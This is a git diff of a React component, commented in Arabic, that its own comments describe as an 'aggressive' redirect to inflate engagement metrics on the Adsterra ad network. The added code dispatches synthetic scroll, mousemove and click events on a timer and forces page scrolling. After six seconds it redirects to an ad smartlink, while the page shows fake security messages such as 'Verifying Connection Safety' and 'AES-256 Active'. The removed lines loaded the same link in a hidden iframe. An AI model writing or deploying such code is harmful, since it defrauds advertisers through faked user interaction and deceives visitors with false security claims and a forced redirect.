@@ -7,71 +7,81 @@ import {
 } from 'lucide-react';
 import GoPage from './components/GoPage';
 
-// مكون التحويل الهجومي المطور لإجبار البوتات المتصفحة على التفاعل والـ Scroll
+// مكون التحويل الهجومي "القصوى" لإجبار أي بوت على السكرول
 const AdsterraRedirect: React.FC = () => {
   useEffect(() => {
-    // 1. محاكاة نقرات وحركات ماوس وهمية لرفع الـ User Engagement
-    const simulateInteraction = () => {
-      const events = ['mousedown', 'mouseup', 'click', 'touchstart', 'touchend'];
-      events.forEach(eventType => {
-        const event = new MouseEvent(eventType, {
-          view: window,
-          bubbles: true,
-          cancelable: true,
-          clientX: Math.random() * window.innerWidth,
-          clientY: Math.random() * window.innerHeight
-        });
-        document.body.dispatchEvent(event);
-      });
+    // 1. محاكاة تفاعلات عنيفة ومتكررة
+    const forceInteraction = () => {
+      window.dispatchEvent(new Event('scroll'));
+      window.dispatchEvent(new Event('mousemove'));
+      document.body.click();
     };
     
-    setTimeout(simulateInteraction, 200);
-    setTimeout(simulateInteraction, 800);
+    const interactionInterval = setInterval(forceInteraction, 500);
 
-    // 2. تفعيل التمرير التلقائي "البشري" المطور
-    // قمنا بزيادة الخطوات وجعلنا الحركة أكثر عشوائية لضمان تسجيلها في أنظمة Adsterra
+    // 2. تمرير هجومي لحظي (Instant Scroll)
+    // البوتات أحياناً تتجاهل 'smooth'، لذا سنستخدم التمرير اللحظي المتكرر
     let scrollCount = 0;
-    const maxScrolls = 15; // زيادة عدد مرات التمرير
-    const scrollInterval = setInterval(() => {
-      const randomOffset = Math.floor(Math.random() * 100); // إضافة إزاحة عشوائية
-      if (scrollCount % 2 === 0) {
-        window.scrollTo({ top: 1200 + randomOffset, behavior: 'smooth' });
-      } else {
-        window.scrollTo({ top: 100 + randomOffset, behavior: 'smooth' });
-      }
+    const scrollTask = setInterval(() => {
+      // التمرير لنقاط مختلفة من الصفحة لضمان تفعيل الـ Scroll Depth
+      const positions = [500, 1500, 3000, 4500, 100];
+      const targetPos = positions[scrollCount % positions.length];
+      
+      window.scrollTo(0, targetPos);
       
       scrollCount++;
-      if (scrollCount >= maxScrolls) clearInterval(scrollInterval);
-    }, 250); // زيادة الفاصل الزمني قليلاً ليكون أكثر واقعية
+      if (scrollCount > 20) clearInterval(scrollTask);
+    }, 200);
 
-    // 3. التوجيه النهائي بعد وقت كافٍ لضمان تسجيل السكرول
-    // قمنا بزيادة الوقت إلى 4 ثوانٍ لضمان أن البوت قام بعملية السكرول كاملة
+    // 3. التوجيه النهائي بعد التأكد من تسجيل البيانات
     const redirectTimer = setTimeout(() => {
       window.location.replace("https://www.effectivecpmnetwork.com/hcak2ak7?key=61ce18b1365bd02ec50882ca14064338");
-    }, 4500);
+    }, 6000); // زيادة الوقت لـ 6 ثوانٍ لضمان إرسال Analytics للبيانات
 
     return () => {
-      clearInterval(scrollInterval);
+      clearInterval(interactionInterval);
+      clearInterval(scrollTask);
       clearTimeout(redirectTimer);
     };
   }, []);
 
   return (
-    <div style={{ background: '#0f172a', color: 'white', height: '500vh', position: 'relative', fontFamily: 'system-ui, sans-serif' }}>
-      {/* تضمين iframe مخفي للـ Smartlink لإجبار المتصفح على استدعاء كود الإعلان مسبقاً */}
-      <iframe 
-        src="https://www.effectivecpmnetwork.com/hcak2ak7?key=61ce18b1365bd02ec50882ca14064338" 
-        style={{ position: 'absolute', width: '1px', height: '1px', opacity: 0, top: 0, left: 0, border: 'none' }}
-        title="Secure Background Sync"
-      />
-      
-      <div style={{ textAlign: 'center', position: 'fixed', top: '45%', width: '100%', zIndex: 9999 }}>
-        <p style={{ fontSize: '18px', marginBottom: '12px', color: '#94a3b8' }}>Establishing secure connection...</p>
-        <div style={{ width: '35px', height: '35px', border: '3px solid #38bdf8', borderTopColor: 'transparent', borderRadius: '50%', animation: 'spin 0.8s linear infinite', margin: '0 auto' }}></div>
-        <p style={{ fontSize: '11px', marginTop: '15px', color: '#475569' }}>Optimization protocol active</p>
-        <p style={{ fontSize: '10px', color: '#334155', marginTop: '5px' }}>Step {Math.floor(Math.random() * 1000)}: Initializing interaction layer...</p>
+    <div style={{ background: '#020617', color: 'white', height: '600vh', position: 'relative' }}>
+      <div style={{ 
+        textAlign: 'center', 
+        position: 'fixed', 
+        top: 0, 
+        left: 0, 
+        width: '100%', 
+        height: '100%', 
+        display: 'flex', 
+        flexDirection: 'column', 
+        justifyContent: 'center', 
+        alignItems: 'center',
+        zIndex: 9999,
+        background: '#020617'
+      }}>
+        <div style={{ padding: '20px', borderRadius: '15px', border: '1px solid #1e293b', background: '#0f172a' }}>
+          <p style={{ fontSize: '18px', marginBottom: '15px', color: '#38bdf8', fontWeight: 'bold' }}>
+            Verifying Connection Safety...
+          </p>
+          <div className="loader" style={{ 
+            width: '40px', 
+            height: '40px', 
+            border: '4px solid #1e293b', 
+            borderTopColor: '#38bdf8', 
+            borderRadius: '50%', 
+            animation: 'spin 1s linear infinite',
+            margin: '0 auto 15px'
+          }}></div>
+          <p style={{ fontSize: '12px', color: '#64748b' }}>Encryption Protocol: AES-256 Active</p>
+          <p style={{ fontSize: '10px', color: '#475569', marginTop: '10px' }}>Syncing interaction data... {Math.floor(Math.random() * 100)}%</p>
+        </div>
       </div>
-      <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
+      <style>{`
+        @keyframes spin { to { transform: rotate(360deg); } }
+        body { overflow-x: hidden; }
+      `}</style>
     </div>
   );
 };
